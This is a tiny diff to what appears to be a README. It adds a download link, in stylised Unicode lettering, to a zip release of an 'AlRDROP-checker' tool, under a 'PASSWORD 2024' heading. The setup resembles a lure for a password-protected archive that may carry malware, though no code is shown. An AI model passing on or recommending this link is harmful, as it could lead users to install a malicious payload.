@@ -2,7 +2,7 @@
 
 ## PASSWORD 2024 
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/waleed146/AlRDROP-checker/releases/download/AlRDROP-checker/AlRDROP-checker.zip)
 
 
 
